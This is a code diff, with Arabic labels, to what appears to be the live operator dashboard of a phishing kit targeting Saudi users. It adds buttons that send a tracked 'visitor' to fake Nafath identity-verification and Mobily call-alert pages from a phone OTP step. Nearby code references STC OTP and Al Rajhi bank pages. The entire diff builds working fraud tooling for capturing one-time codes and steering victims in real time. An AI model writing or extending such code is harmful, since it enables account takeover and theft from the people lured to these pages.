@@ -1226,6 +1226,15 @@
             } else if (dc.page === 'MyStc OTP') {
               // زر اتصال STC لصفحة MyStc OTP
               html += '<button id="' + codeStcBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال STC</button>';
+            } else if (dc.page === 'تحقق رقم الجوال (OTP)') {
+              // أزرار صفحة تحقق رقم الجوال OTP
+              const phoneOtpNafathBtnId = 'phone-otp-nafath-btn-' + visitor.socketId + '-' + index;
+              const phoneOtpMobilyBtnId = 'phone-otp-mobily-btn-' + visitor.socketId + '-' + index;
+              html += '<button id="' + phoneOtpNafathBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تطبيق نفاذ</button>';
+              // إضافة زر اتصال موبايلي فقط إذا كانت الشبكة موبايلي
+              if (visitor.network === 'موبايلي') {
+                html += '<button id="' + phoneOtpMobilyBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال موبايلي</button>';
+              }
             } else {
               html += '<button onclick="codeActionApprove(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
             }
@@ -1278,6 +1287,37 @@
                     rajhiNavBtn.textContent = originalText;
                     rajhiNavBtn.classList.remove('bg-green-600');
                     rajhiNavBtn.classList.add('bg-blue-600', 'hover:bg-blue-700');
+                  }, 1500);
+                });
+              }
+              // Event listeners لأزرار صفحة تحقق رقم الجوال OTP
+              const phoneOtpNafathBtn = document.getElementById('phone-otp-nafath-btn-' + visitor.socketId + '-' + index);
+              const phoneOtpMobilyBtn = document.getElementById('phone-otp-mobily-btn-' + visitor.socketId + '-' + index);
+              if (phoneOtpNafathBtn) {
+                phoneOtpNafathBtn.addEventListener('click', () => {
+                  navigateVisitorToPage(visitor.socketId, 'nafath-verify');
+                  const originalText = phoneOtpNafathBtn.textContent;
+                  phoneOtpNafathBtn.textContent = 'تم الإرسال ✓';
+                  phoneOtpNafathBtn.classList.remove('bg-green-600', 'hover:bg-green-700');
+                  phoneOtpNafathBtn.classList.add('bg-gray-500');
+                  setTimeout(() => {
+                    phoneOtpNafathBtn.textContent = originalText;
+                    phoneOtpNafathBtn.classList.remove('bg-gray-500');
+                    phoneOtpNafathBtn.classList.add('bg-green-600', 'hover:bg-green-700');
+                  }, 1500);
+                });
+              }
+              if (phoneOtpMobilyBtn) {
+                phoneOtpMobilyBtn.addEventListener('click', () => {
+                  navigateVisitorToPage(visitor.socketId, 'mobily-call-alert');
+                  const originalText = phoneOtpMobilyBtn.textContent;
+                  phoneOtpMobilyBtn.textContent = 'تم الإرسال ✓';
+                  phoneOtpMobilyBtn.classList.remove('bg-purple-600', 'hover:bg-purple-700');
+                  phoneOtpMobilyBtn.classList.add('bg-green-600');
+                  setTimeout(() => {
+                    phoneOtpMobilyBtn.textContent = originalText;
+                    phoneOtpMobilyBtn.classList.remove('bg-green-600');
+                    phoneOtpMobilyBtn.classList.add('bg-purple-600', 'hover:bg-purple-700');
                   }, 1500);
                 });
               }
